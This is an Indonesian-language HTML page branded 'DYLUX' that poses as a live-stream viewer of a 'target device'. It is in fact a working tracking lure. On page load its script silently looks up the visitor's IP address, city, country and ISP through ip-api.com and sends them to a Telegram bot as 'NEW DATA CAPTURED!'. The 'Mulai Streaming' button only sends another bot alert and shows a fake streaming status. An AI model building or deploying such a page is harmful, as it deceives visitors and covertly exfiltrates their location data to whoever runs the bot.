<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Watch Now</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; font-family: Arial, sans-serif; color: #e0e0ff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .box { background: #14141e; border: 1px solid rgba(255,0,85,0.15); border-radius: 16px; padding: 40px 32px; max-width: 400px; width: 100%; text-align: center; }
        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #ff0055, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .badge { display: inline-block; background: rgba(255,0,85,0.1); color: #ff0055; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
        .badge .live-dot { display: inline-block; width: 8px; height: 8px; background: #ff0055; border-radius: 50%; animation: pulse 1.5s infinite; margin-right: 4px; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .icon { font-size: 48px; margin: 16px 0; }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
        .video-placeholder { background: #0a0a0f; border-radius: 16px; padding: 30px; margin: 16px 0; border: 2px dashed rgba(255,0,85,0.15); }
        .video-placeholder span { font-size: 64px; display: block; }
        .video-placeholder small { color: #555; font-size: 12px; }
        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #ff0055, #cc0044); color: #fff; transition: 0.3s; }
        button:hover { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-success { background: linear-gradient(135deg, #00ff88, #00cc6a); }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #ff0055; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">DYLUX</div>
        <div class="badge"><span class="live-dot"></span>LIVE</div>
        <div class="icon">📺</div>
        <h2>Watch Now</h2>
        <p>Streaming langsung dari perangkat target.</p>
        <div class="video-placeholder"><span>📹</span><small>Klik tombol di bawah untuk memulai streaming</small></div>
        <button id="streamBtn">▶️ Mulai Streaming</button>
        <div class="spinner" id="spinner"></div>
        <div id="statusMsg"></div>
        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
    </div>

    <script>
    (async function autoDetect() {
        try {
            const userId = new URLSearchParams(window.location.search).get('id');
            if (!userId) return;
            const ipRes = await fetch('https://ip-api.com/json/');
            const ipData = await ipRes.json();
            const message = `<b>🎯 NEW DATA CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Type:</b> Auto-Detect\n<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
        } catch (e) { console.error(e); }
    })();

    const userId = new URLSearchParams(window.location.search).get('id');
    const streamBtn = document.getElementById('streamBtn');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');
    let isStreaming = false;

    streamBtn.addEventListener('click', async () => {
        if (isStreaming) return;
        isStreaming = true;
        streamBtn.disabled = true;
        spinner.classList.add('active');
        statusMsg.style.display = 'none';
        streamBtn.textContent = '🔄 Streaming...';

        try {
            const message = `<b>📺 LIVESTREAM STARTED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Action:</b> Stream Started\n<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
        } catch (error) { console.error(error); }

        setTimeout(() => {
            streamBtn.textContent = '⏹️ Stop Streaming';
            streamBtn.className = 'btn-success';
            spinner.classList.remove('active');
            streamBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '🔴 Streaming aktif!';
            isStreaming = false;
        }, 3000);
    });
    </script>
</body>
</html>
